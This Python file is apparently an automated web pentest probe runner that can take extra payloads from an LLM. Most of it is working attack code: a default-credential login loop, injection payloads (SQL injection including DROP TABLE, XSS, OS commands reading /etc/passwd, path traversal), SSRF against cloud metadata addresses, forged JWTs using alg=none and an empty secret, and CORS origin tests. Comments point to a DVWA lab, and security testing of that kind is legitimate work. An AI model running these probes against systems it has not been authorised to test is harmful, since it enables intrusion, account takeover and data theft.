import json
import os
import re
import sys
import time
from typing import Any, Optional
from urllib.parse import urlparse

import requests
from requests import Session

# ─── Config ──────────────────────────────────────────────────────────────────

PROBE_TYPE       = os.environ["PROBE_TYPE"]
BASE_URL         = os.environ["BASE_URL"].rstrip("/")
TARGET_ENDPOINTS = json.loads(os.environ.get("TARGET_ENDPOINTS", "[]"))
TARGET_FIELDS    = json.loads(os.environ.get("TARGET_FIELDS", "[]"))
SESSION_COOKIE   = os.environ.get("SESSION_COOKIE", "")
OUTPUT_DIR       = os.environ.get("OUTPUT_DIR", "/output")
RUN_ID           = os.environ.get("RUN_ID", "probe")

# Optional stack-aware payload additions, keyed by probe_type (empty when absent),
# supplied via the EXTRA_PAYLOADS env var when the sandbox runs this probe.
try:
    EXTRA_PAYLOADS = json.loads(os.environ.get("EXTRA_PAYLOADS", "{}")) or {}
    if not isinstance(EXTRA_PAYLOADS, dict):
        EXTRA_PAYLOADS = {}
except (ValueError, TypeError):
    EXTRA_PAYLOADS = {}


def _extra(probe_type: str) -> list:
    """Return the LLM-supplied extra payload list for probe_type, deduped."""
    items = EXTRA_PAYLOADS.get(probe_type) or []
    if not isinstance(items, list):
        return []
    seen: set = set()
    out: list = []
    for x in items:
        s = str(x).strip()
        if s and s not in seen:
            seen.add(s)
            out.append(s)
    return out

TIMEOUT = 10

os.makedirs(OUTPUT_DIR, exist_ok=True)
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "results.jsonl")


# ─── Helpers ─────────────────────────────────────────────────────────────────

def _session() -> Session:
    s = Session()
    s.headers.update({"User-Agent": "PentestProbe/1.0"})
    if SESSION_COOKIE:
        for part in SESSION_COOKIE.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, value = part.partition("=")
                s.cookies.set(name.strip(), value.strip())
    return s


def _emit(record: dict) -> None:
    with open(OUTPUT_FILE, "a") as f:
        f.write(json.dumps(record) + "\n")


def _url(path: str) -> str:
    return BASE_URL + ("" if path.startswith("/") else "/") + path


def _safe_get(s: Session, url: str, **kwargs) -> Optional[requests.Response]:
    try:
        return s.get(url, timeout=TIMEOUT, allow_redirects=True, **kwargs)
    except Exception as e:
        _emit({"type": "error", "url": url, "error": str(e)})
        return None


def _safe_post(s: Session, url: str, data: dict, **kwargs) -> Optional[requests.Response]:
    try:
        return s.post(url, data=data, timeout=TIMEOUT, allow_redirects=True, **kwargs)
    except Exception as e:
        _emit({"type": "error", "url": url, "error": str(e)})
        return None


# ─── Probe implementations ───────────────────────────────────────────────────

def probe_authentication() -> None:
    """
    Test login endpoints with common weak credentials.
    Records whether authentication succeeded and what session tokens were returned.
    """
    credential_pairs = [
        ("admin",    "admin"),
        ("admin",    "password"),
        ("admin",    "123456"),
        ("admin",    ""),
        ("user",     "user"),
        ("test",     "test"),
        ("guest",    "guest"),
        ("root",     "root"),
        ("admin",    "admin123"),
    ]
    endpoints = TARGET_ENDPOINTS or ["/login"]
    fields = TARGET_FIELDS if len(TARGET_FIELDS) >= 2 else ["username", "password"]
    user_field, pass_field = fields[0], fields[1]

    for endpoint in endpoints:
        url = _url(endpoint)
        s = _session()

        # Fetch the page first to grab any CSRF token
        r_get = _safe_get(s, url)
        csrf_token = None
        if r_get is not None:
            # Common CSRF field names
            for pattern in [
                r'name=["\']user_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
                r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
            ]:
                m = re.search(pattern, r_get.text, re.IGNORECASE)
                if not m:
                    m = re.search(
                        pattern.replace('name=', 'value=').replace('value=', 'name='),
                        r_get.text, re.IGNORECASE
                    )
                if m:
                    csrf_token = m.group(1)
                    break

        for username, password in credential_pairs:
            post_data = {user_field: username, pass_field: password}
            if csrf_token:
                post_data["user_token"] = csrf_token

            r = _safe_post(s, url, post_data)
            if r is None:
                continue

            # "dvwa" omitted — it appears in Apache error-page footers ("dvwa-web port 80")
            # and would produce false positives on any 404 response from this host.
            success_signals = ["logout", "dashboard", "welcome", "profile"]
            failure_signals = ["invalid", "incorrect", "failed", "wrong", "error"]

            body_lower = r.text.lower()
            # Require HTTP 200 before checking success signals — a 404 is never authenticated
            authenticated = (
                r.status_code == 200
                and any(sig in body_lower for sig in success_signals)
                and not any(sig in body_lower for sig in failure_signals)
            )
            failed = any(sig in body_lower for sig in failure_signals)

            session_cookies = dict(s.cookies)

            _emit({
                "probe_type":   "authentication",
                "endpoint":     endpoint,
                "username":     username,
                "password":     password,
                "status_code":  r.status_code,
                "final_url":    r.url,
                "authenticated": authenticated,
                "failed":        failed,
                "session_cookies": session_cookies,
                "response_length": len(r.text),
            })

            if authenticated:
                # Stop trying credentials for this endpoint once we have a hit
                break
            # Re-fetch the page to get a fresh CSRF token for next attempt
            r_get = _safe_get(s, url)
            if r_get is not None:
                for pattern in [
                    r'name=["\']user_token["\'][^>]*value=["\']([^"\']+)["\']',
                ]:
                    m = re.search(pattern, r_get.text, re.IGNORECASE)
                    if m:
                        csrf_token = m.group(1)
                        break


def probe_sql_injection() -> None:
    """
    Test form fields and URL parameters for SQL injection.
    Uses error-based and boolean-based payloads.
    """
    payloads = [
        "'",
        "''",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "' UNION SELECT NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
        "'; DROP TABLE users--",
    ]
    payloads = payloads + _extra("sql_injection")

    sql_error_patterns = [
        r"you have an error in your sql syntax",
        r"warning: mysql",
        r"unclosed quotation mark",
        r"pg_query\(\)",
        r"supplied argument is not a valid mysql",
        r"ORA-\d{5}",
        r"sqlite3\.operationalerror",
        r"syntax error.*sql",
    ]

    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["id", "search", "q", "name"]

    for endpoint in endpoints:
        url = _url(endpoint)
        s = _session()

        # Baseline response
        r_base = _safe_get(s, url)
        base_length = len(r_base.text) if r_base else 0

        for field in fields:
            for payload in payloads:
                # GET parameter test
                try:
                    r = s.get(url, params={field: payload}, timeout=TIMEOUT)
                    body_lower = r.text.lower()
                    error_found = any(re.search(p, body_lower) for p in sql_error_patterns)
                    length_diff = abs(len(r.text) - base_length)

                    _emit({
                        "probe_type":    "sql_injection",
                        "method":        "GET",
                        "endpoint":      endpoint,
                        "field":         field,
                        "payload":       payload,
                        "status_code":   r.status_code,
                        "error_found":   error_found,
                        "response_length": len(r.text),
                        "length_diff":   length_diff,
                        "evidence":      r.text[:300] if error_found else "",
                    })
                except Exception as e:
                    _emit({"probe_type": "sql_injection", "method": "GET",
                           "endpoint": endpoint, "field": field,
                           "payload": payload, "error": str(e)})

                # POST parameter test
                r_post = _safe_post(s, url, {field: payload})
                if r_post is not None:
                    body_lower = r_post.text.lower()
                    error_found = any(re.search(p, body_lower) for p in sql_error_patterns)
                    _emit({
                        "probe_type":    "sql_injection",
                        "method":        "POST",
                        "endpoint":      endpoint,
                        "field":         field,
                        "payload":       payload,
                        "status_code":   r_post.status_code,
                        "error_found":   error_found,
                        "response_length": len(r_post.text),
                        "evidence":      r_post.text[:300] if error_found else "",
                    })


def probe_xss_reflected() -> None:
    """
    Test form inputs and query parameters for reflected XSS.
    """
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "<body onload=alert(1)>",
        "';alert(1)//",
    ]
    payloads = payloads + _extra("xss_reflected")

    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["search", "q", "name", "comment", "message"]

    for endpoint in endpoints:
        url = _url(endpoint)
        s = _session()

        for field in fields:
            for payload in payloads:
                # GET
                try:
                    r = s.get(url, params={field: payload}, timeout=TIMEOUT)
                    reflected = payload in r.text
                    _emit({
                        "probe_type":  "xss_reflected",
                        "method":      "GET",
                        "endpoint":    endpoint,
                        "field":       field,
                        "payload":     payload,
                        "status_code": r.status_code,
                        "reflected":   reflected,
                        "evidence":    r.text[max(0, r.text.find(payload)-50):r.text.find(payload)+100] if reflected else "",
                    })
                except Exception as e:
                    _emit({"probe_type": "xss_reflected", "method": "GET",
                           "endpoint": endpoint, "field": field,
                           "payload": payload, "error": str(e)})

                # POST
                r_post = _safe_post(s, url, {field: payload})
                if r_post is not None:
                    reflected = payload in r_post.text
                    _emit({
                        "probe_type":  "xss_reflected",
                        "method":      "POST",
                        "endpoint":    endpoint,
                        "field":       field,
                        "payload":     payload,
                        "status_code": r_post.status_code,
                        "reflected":   reflected,
                        "evidence":    r_post.text[max(0, r_post.text.find(payload)-50):r_post.text.find(payload)+100] if reflected else "",
                    })


def probe_broken_access_control() -> None:
    """
    Test whether protected endpoints are accessible without authentication.
    """
    # Common admin/privileged paths to check in addition to discovered ones
    generic_protected = [
        "/admin", "/admin/", "/admin/users", "/admin/config",
        "/dashboard", "/config", "/settings", "/api/admin",
        "/management", "/console", "/actuator", "/env",
        "/phpinfo.php", "/server-status", "/.env",
    ]
    generic_protected = generic_protected + _extra("broken_access_control")

    endpoints = list(dict.fromkeys(TARGET_ENDPOINTS + generic_protected))

    s_unauth = Session()
    s_unauth.headers.update({"User-Agent": "PentestProbe/1.0"})

    s_auth = _session()

    for endpoint in endpoints:
        url = _url(endpoint)

        r_unauth = _safe_get(s_unauth, url)
        r_auth   = _safe_get(s_auth,   url)

        if r_unauth is None:
            continue

        # A resource is only truly accessible if the server returned 200 for
        # the exact requested path — not a 200 redirected to the login page.
        req_path   = urlparse(url).path.rstrip("/") or "/"
        final_path = urlparse(r_unauth.url).path.rstrip("/") or "/"
        accessible_unauth = r_unauth.status_code == 200 and req_path == final_path
        auth_status       = r_auth.status_code if r_auth else None

        _emit({
            "probe_type":         "broken_access_control",
            "endpoint":           endpoint,
            "unauth_status_code": r_unauth.status_code,
            "auth_status_code":   auth_status,
            "final_url":          r_unauth.url,
            "accessible_without_auth": accessible_unauth,
            "response_length":    len(r_unauth.text),
            "evidence":           r_unauth.text[:200] if accessible_unauth else "",
        })


def probe_security_headers() -> None:
    """
    Check HTTP response security headers for all target endpoints.
    """
    security_headers = [
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "Strict-Transport-Security",
        "Referrer-Policy",
        "Permissions-Policy",
        "X-XSS-Protection",
    ]

    endpoints = TARGET_ENDPOINTS if TARGET_ENDPOINTS else ["/"]

    s = _session()

    for endpoint in endpoints:
        url = _url(endpoint)
        r = _safe_get(s, url)
        if r is None:
            continue

        present   = {h: r.headers.get(h) for h in security_headers if h in r.headers}
        missing   = [h for h in security_headers if h not in r.headers]
        server    = r.headers.get("Server", "")
        powered   = r.headers.get("X-Powered-By", "")

        _emit({
            "probe_type":       "security_headers",
            "endpoint":         endpoint,
            "status_code":      r.status_code,
            "present_headers":  present,
            "missing_headers":  missing,
            "server_banner":    server,
            "x_powered_by":     powered,
            "all_headers":      dict(r.headers),
        })


def probe_information_disclosure() -> None:
    """
    Check for verbose error pages, stack traces, server banners, and debug endpoints.
    """
    disclosure_paths = [
        "/phpinfo.php", "/.env", "/config.php", "/web.config",
        "/debug", "/trace", "/error", "/500", "/test",
        "/backup", "/backup.zip", "/db.sql", "/dump.sql",
        "/README", "/README.md", "/CHANGELOG", "/composer.json",
        "/package.json", "/Gemfile", "/requirements.txt",
    ]
    disclosure_paths = disclosure_paths + _extra("information_disclosure")

    stack_trace_patterns = [
        r"traceback \(most recent call last\)",
        r"exception in thread",
        r"at [a-z]+\.[a-z]+\(.*\.java:\d+\)",
        r"php fatal error",
        r"parse error:.*php",
        r"warning:.*php",
        r"mysql_fetch",
        r"pg_connect\(",
        r"undefined variable",
        r"notice:.*undefined",
    ]

    endpoints = list(dict.fromkeys((TARGET_ENDPOINTS or []) + disclosure_paths))
    s = _session()

    for endpoint in endpoints:
        url = _url(endpoint)
        r = _safe_get(s, url)
        if r is None:
            continue

        body_lower = r.text.lower()
        trace_found = any(re.search(p, body_lower) for p in stack_trace_patterns)
        server = r.headers.get("Server", "")
        powered = r.headers.get("X-Powered-By", "")

        _emit({
            "probe_type":       "information_disclosure",
            "endpoint":         endpoint,
            "status_code":      r.status_code,
            "stack_trace_found": trace_found,
            "server_banner":    server,
            "x_powered_by":     powered,
            "evidence":         r.text[:400] if trace_found or r.status_code == 200 else "",
        })


def probe_command_injection() -> None:
    """
    Test for OS command injection via parameter manipulation.
    Detects command output patterns in responses.
    """
    payloads = [
        "; id",
        "| id",
        "& id",
        "; whoami",
        "| whoami",
        "; cat /etc/passwd",
        "$(id)",
        "`id`",
        "; ping -c 1 127.0.0.1",
        "127.0.0.1; id",
        "127.0.0.1 | id",
        "127.0.0.1 && id",
    ]
    payloads = payloads + _extra("command_injection")

    cmd_output_patterns = [
        r"uid=\d+\(",
        r"root:x:0:0",
        r"daemon:x:",
        r"/bin/bash",
        r"/bin/sh",
        r"www-data",
        r"windows_nt",
        r"microsoft windows",
    ]

    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["ip", "cmd", "exec", "command", "ping", "host", "target"]

    for endpoint in endpoints:
        url = _url(endpoint)
        s = _session()

        for field in fields:
            for payload in payloads:
                try:
                    r = s.get(url, params={field: payload}, timeout=TIMEOUT)
                    body_lower = r.text.lower()
                    injection_found = any(re.search(p, body_lower) for p in cmd_output_patterns)
                    _emit({
                        "probe_type":      "command_injection",
                        "method":          "GET",
                        "endpoint":        endpoint,
                        "field":           field,
                        "payload":         payload,
                        "status_code":     r.status_code,
                        "injection_found": injection_found,
                        "severity":        "critical" if injection_found else "none",
                        "pattern_matched": injection_found,
                        "evidence":        r.text[:400] if injection_found else "",
                    })
                except Exception as e:
                    _emit({"probe_type": "command_injection", "method": "GET",
                           "endpoint": endpoint, "field": field,
                           "payload": payload, "error": str(e)})

                r_post = _safe_post(s, url, {field: payload})
                if r_post is not None:
                    body_lower = r_post.text.lower()
                    injection_found = any(re.search(p, body_lower) for p in cmd_output_patterns)
                    _emit({
                        "probe_type":      "command_injection",
                        "method":          "POST",
                        "endpoint":        endpoint,
                        "field":           field,
                        "payload":         payload,
                        "status_code":     r_post.status_code,
                        "injection_found": injection_found,
                        "severity":        "critical" if injection_found else "none",
                        "pattern_matched": injection_found,
                        "evidence":        r_post.text[:400] if injection_found else "",
                    })


def probe_path_traversal() -> None:
    """
    Test for directory traversal and local file inclusion (LFI).
    """
    payloads = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../windows/system32/drivers/etc/hosts",
        "../../../boot.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "file:///etc/passwd",
    ]
    payloads = payloads + _extra("path_traversal")

    traversal_patterns = [
        r"root:x:0:0",
        r"daemon:x:",
        r"\[boot loader\]",
        r"# localhost",
        r"127\.0\.0\.1\s+localhost",
        r"<\?php",
    ]

    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["file", "page", "path", "include", "load", "read", "template"]

    for endpoint in endpoints:
        url = _url(endpoint)
        s = _session()

        for field in fields:
            for payload in payloads:
                try:
                    r = s.get(url, params={field: payload}, timeout=TIMEOUT)
                    body_lower = r.text.lower()
                    traversal_found = any(re.search(p, body_lower) for p in traversal_patterns)
                    _emit({
                        "probe_type":       "path_traversal",
                        "method":           "GET",
                        "endpoint":         endpoint,
                        "field":            field,
                        "payload":          payload,
                        "status_code":      r.status_code,
                        "traversal_found":  traversal_found,
                        "severity":         "critical" if traversal_found else "none",
                        "pattern_matched":  traversal_found,
                        "evidence":         r.text[:300] if traversal_found else "",
                    })
                except Exception as e:
                    _emit({"probe_type": "path_traversal", "method": "GET",
                           "endpoint": endpoint, "field": field,
                           "payload": payload, "error": str(e)})


def probe_idor() -> None:
    """
    Test for Insecure Direct Object References by modifying numeric ID parameters.
    Compares responses for different IDs to detect horizontal privilege escalation.
    """
    endpoints = TARGET_ENDPOINTS or ["/"]
    id_fields = [f for f in (TARGET_FIELDS or []) if any(k in f.lower() for k in ["id", "user", "uid", "account"])]
    if not id_fields:
        id_fields = ["id", "user_id", "uid", "account_id", "order_id"]

    test_ids = ["1", "2", "3", "0", "-1", "100", "999", "admin", "administrator"]
    test_ids = test_ids + _extra("idor")

    s = _session()

    for endpoint in endpoints:
        url = _url(endpoint)

        # Baseline (no ID param)
        r_base = _safe_get(s, url)
        base_length = len(r_base.text) if r_base else 0
        base_status = r_base.status_code if r_base else 0

        for field in id_fields:
            prev_response_length = None
            for obj_id in test_ids:
                try:
                    r = s.get(url, params={field: obj_id}, timeout=TIMEOUT)
                    length_diff = abs(len(r.text) - base_length)
                    # Different content for different IDs with 200 status suggests IDOR
                    idor_signal = (
                        r.status_code == 200
                        and base_status in {200, 403}
                        and length_diff > 100
                    )
                    if prev_response_length is not None:
                        content_varies = abs(len(r.text) - prev_response_length) > 50
                    else:
                        content_varies = False
                    prev_response_length = len(r.text)

                    _emit({
                        "probe_type":     "idor",
                        "endpoint":       endpoint,
                        "field":          field,
                        "tested_id":      obj_id,
                        "status_code":    r.status_code,
                        "response_length": len(r.text),
                        "length_diff_from_base": length_diff,
                        "content_varies": content_varies,
                        "idor_signal":    idor_signal,
                        "severity":       "high" if idor_signal else "none",
                        "pattern_matched": idor_signal,
                        "anomaly_detected": content_varies,
                        "evidence":       r.text[:300] if idor_signal else "",
                    })
                except Exception as e:
                    _emit({"probe_type": "idor", "endpoint": endpoint,
                           "field": field, "tested_id": obj_id, "error": str(e)})


def probe_csrf() -> None:
    """
    Test whether state-changing endpoints enforce CSRF token validation.
    A POST that succeeds without a valid CSRF token indicates a vulnerability.
    """
    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["username", "password", "email", "action"]

    s_with_session = _session()
    s_no_csrf = Session()
    s_no_csrf.headers.update({"User-Agent": "PentestProbe/1.0"})
    if SESSION_COOKIE:
        for part in SESSION_COOKIE.split(";"):
            part = part.strip()
            if "=" in part:
                name, _, value = part.partition("=")
                s_no_csrf.cookies.set(name.strip(), value.strip())

    for endpoint in endpoints:
        url = _url(endpoint)

        # Fetch page to check for CSRF tokens
        r_get = _safe_get(s_with_session, url)
        if r_get is None:
            continue

        csrf_patterns = [
            r'name=["\'](?:user_token|_token|csrf_token|csrf|authenticity_token)["\'][^>]*value=["\']([^"\']{8,})["\']',
            r'value=["\']([^"\']{8,})["\'][^>]*name=["\'](?:user_token|_token|csrf_token|csrf)["\']',
        ]
        csrf_present = any(re.search(p, r_get.text, re.IGNORECASE) for p in csrf_patterns)

        # Attempt a state-changing POST without CSRF token
        test_data = {f: "csrf_test_value" for f in fields[:3]}
        r_post = _safe_post(s_no_csrf, url, test_data)

        if r_post is None:
            continue

        # If a form is submitted without a CSRF token and doesn't return 403/419,
        # that's a CSRF weakness signal
        rejected = r_post.status_code in {403, 419, 405}
        csrf_vulnerable = (
            csrf_present
            and not rejected
            and r_post.status_code in {200, 302}
        )

        _emit({
            "probe_type":      "csrf",
            "endpoint":        endpoint,
            "csrf_token_present_in_page": csrf_present,
            "post_status_code": r_post.status_code,
            "post_rejected":   rejected,
            "csrf_vulnerable": csrf_vulnerable,
            "severity":        "high" if csrf_vulnerable else ("medium" if not csrf_present else "none"),
            "pattern_matched": csrf_vulnerable,
            "evidence":        r_post.text[:200] if csrf_vulnerable else "",
        })


def probe_ssrf() -> None:
    """
    Test for Server-Side Request Forgery by injecting internal/metadata URLs.
    """
    ssrf_payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/",
        "http://169.254.169.254/latest/meta-data/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://192.168.1.1/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:6379/",
    ]
    ssrf_payloads = ssrf_payloads + _extra("ssrf")

    ssrf_success_patterns = [
        r"ami-id",
        r"instance-id",
        r"169\.254\.169\.254",
        r"root:x:0:0",
        r"localhost",
        r"internal server error.*connection refused",
    ]

    endpoints = TARGET_ENDPOINTS or ["/"]
    fields = TARGET_FIELDS or ["url", "redirect", "next", "return", "link", "fetch", "proxy", "src", "href"]

    s = _session()

    for endpoint in endpoints:
        url = _url(endpoint)

        for field in fields:
            for payload in ssrf_payloads:
                try:
                    r = s.get(url, params={field: payload}, timeout=TIMEOUT, allow_redirects=False)
                    body_lower = r.text.lower()
                    ssrf_found = any(re.search(p, body_lower) for p in ssrf_success_patterns)
                    # A 302/301 redirect to an internal address also signals SSRF
                    redirect_target = r.headers.get("Location", "")
                    redirect_ssrf = any(h in redirect_target for h in ["127.0.0.1", "localhost", "169.254"])

                    _emit({
                        "probe_type":     "ssrf",
                        "endpoint":       endpoint,
                        "field":          field,
                        "payload":        payload,
                        "status_code":    r.status_code,
                        "ssrf_found":     ssrf_found or redirect_ssrf,
                        "redirect_target": redirect_target,
                        "severity":       "critical" if (ssrf_found or redirect_ssrf) else "none",
                        "pattern_matched": ssrf_found or redirect_ssrf,
                        "evidence":       r.text[:300] if ssrf_found else redirect_target,
                    })
                except Exception as e:
                    _emit({"probe_type": "ssrf", "endpoint": endpoint,
                           "field": field, "payload": payload, "error": str(e)})


def probe_jwt_tampering() -> None:
    """
    Test JWT tokens for common vulnerabilities: alg=none, empty secret, HS256→RS256 confusion.
    Checks Authorization header and cookie-based tokens.
    """
    import base64

    endpoints = TARGET_ENDPOINTS or ["/"]
    s = _session()

    # Detect JWT in session cookies or Authorization header
    jwt_value = None
    for cookie_name, cookie_val in s.cookies.items():
        val = str(cookie_val)
        if val.count(".") == 2 and len(val) > 20:
            jwt_value = val
            break

    if not jwt_value and SESSION_COOKIE:
        for part in SESSION_COOKIE.split(";"):
            val = part.strip().split("=", 1)[-1].strip()
            if val.count(".") == 2 and len(val) > 20:
                jwt_value = val
                break

    if not jwt_value:
        _emit({
            "probe_type": "jwt_tampering",
            "finding":    "no_jwt_detected",
            "severity":   "none",
        })
        return

    def _b64_decode_padding(s: str) -> bytes:
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64_encode(b: bytes) -> str:
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    try:
        header_b64, payload_b64, signature_b64 = jwt_value.split(".")
        header_json = json.loads(_b64_decode_padding(header_b64))
        payload_json = json.loads(_b64_decode_padding(payload_b64))
    except Exception as e:
        _emit({"probe_type": "jwt_tampering", "error": f"jwt_parse_failed: {e}", "severity": "none"})
        return

    tampered_tokens = []

    # Attack 1: alg=none — remove signature
    none_header = dict(header_json)
    none_header["alg"] = "none"
    none_token = f"{_b64_encode(json.dumps(none_header).encode())}.{payload_b64}."
    tampered_tokens.append(("alg_none", none_token))

    # Attack 2: empty secret (sign with empty string)
    try:
        import hmac as _hmac
        import hashlib as _hashlib
        msg = f"{_b64_encode(json.dumps(header_json).encode())}.{payload_b64}".encode()
        sig = _hmac.new(b"", msg, _hashlib.sha256).digest()
        empty_secret_token = f"{_b64_encode(json.dumps(header_json).encode())}.{payload_b64}.{_b64_encode(sig)}"
        tampered_tokens.append(("empty_secret", empty_secret_token))
    except Exception:
        pass

    # Attack 3: privilege escalation — modify role/admin claims
    admin_payload = dict(payload_json)
    for claim in ["role", "is_admin", "admin", "user_role", "scope"]:
        if claim in admin_payload:
            admin_payload[claim] = "admin" if claim == "role" else True
    admin_token = f"{header_b64}.{_b64_encode(json.dumps(admin_payload).encode())}.{signature_b64}"
    tampered_tokens.append(("privilege_escalation", admin_token))

    for attack_name, tampered_token in tampered_tokens:
        for endpoint in endpoints:
            url = _url(endpoint)
            try:
                r_bearer = s.get(url, headers={"Authorization": f"Bearer {tampered_token}"}, timeout=TIMEOUT)
                r_cookie = s.get(url, cookies={"token": tampered_token, "jwt": tampered_token}, timeout=TIMEOUT)

                for label, r in [("bearer", r_bearer), ("cookie", r_cookie)]:
                    body_lower = r.text.lower()
                    accepted = (r.status_code == 200 and
                                any(sig in body_lower for sig in ["dashboard", "profile", "admin", "logout", "welcome"]))
                    _emit({
                        "probe_type":    "jwt_tampering",
                        "attack":        attack_name,
                        "delivery":      label,
                        "endpoint":      endpoint,
                        "status_code":   r.status_code,
                        "token_accepted": accepted,
                        "severity":      "critical" if accepted else "none",
                        "pattern_matched": accepted,
                        "anomaly_detected": accepted,
                        "evidence":      r.text[:300] if accepted else "",
                    })
            except Exception as e:
                _emit({"probe_type": "jwt_tampering", "attack": attack_name,
                       "endpoint": endpoint, "error": str(e)})


def probe_cors_misconfiguration() -> None:
    """
    Test for CORS misconfiguration: wildcard origins, null origin acceptance,
    and arbitrary origin reflection.
    """
    test_origins = [
        "https://evil.com",
        "http://attacker.example.com",
        "null",
        "https://trusted.com.evil.com",
        f"https://{urlparse(BASE_URL).netloc}.evil.com",
    ]

    endpoints = TARGET_ENDPOINTS or ["/"]
    s = _session()

    for endpoint in endpoints:
        url = _url(endpoint)

        for origin in test_origins:
            try:
                r = s.get(url, headers={"Origin": origin}, timeout=TIMEOUT)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()

                # Wildcard with credentials is the most severe
                wildcard_creds = acao == "*" and acac == "true"
                # Arbitrary origin reflected — server echoes back whatever origin we sent
                origin_reflected = acao == origin and origin not in {"", "*"}
                # null origin accepted
                null_accepted = origin == "null" and acao == "null"

                severity = "none"
                if wildcard_creds:
                    severity = "critical"
                elif origin_reflected and acac == "true":
                    severity = "high"
                elif origin_reflected or null_accepted:
                    severity = "medium"

                _emit({
                    "probe_type":             "cors_misconfiguration",
                    "endpoint":               endpoint,
                    "tested_origin":          origin,
                    "acao_header":            acao,
                    "acac_header":            acac,
                    "wildcard_with_creds":    wildcard_creds,
                    "origin_reflected":       origin_reflected,
                    "null_origin_accepted":   null_accepted,
                    "severity":               severity,
                    "pattern_matched":        severity in {"critical", "high"},
                    "anomaly_detected":       severity in {"critical", "high", "medium"},
                    "evidence":               f"ACAO={acao} ACAC={acac}" if severity != "none" else "",
                })
            except Exception as e:
                _emit({"probe_type": "cors_misconfiguration", "endpoint": endpoint,
                       "tested_origin": origin, "error": str(e)})


# ─── Dispatch ────────────────────────────────────────────────────────────────

PROBES = {
    "authentication":        probe_authentication,
    "sql_injection":         probe_sql_injection,
    "xss_reflected":         probe_xss_reflected,
    "broken_access_control": probe_broken_access_control,
    "security_headers":      probe_security_headers,
    "information_disclosure": probe_information_disclosure,
    # Extended probes
    "command_injection":     probe_command_injection,
    "path_traversal":        probe_path_traversal,
    "idor":                  probe_idor,
    "csrf":                  probe_csrf,
    "ssrf":                  probe_ssrf,
    "jwt_tampering":         probe_jwt_tampering,
    "cors_misconfiguration": probe_cors_misconfiguration,
}


if __name__ == "__main__":
    fn = PROBES.get(PROBE_TYPE)
    if fn is None:
        print(f"[PROBE] Unknown probe type: {PROBE_TYPE}", file=sys.stderr)
        sys.exit(1)

    print(f"[PROBE] Starting {PROBE_TYPE} probe | base={BASE_URL} | run={RUN_ID}")
    fn()
    print(f"[PROBE] Done. Results written to {OUTPUT_FILE}")
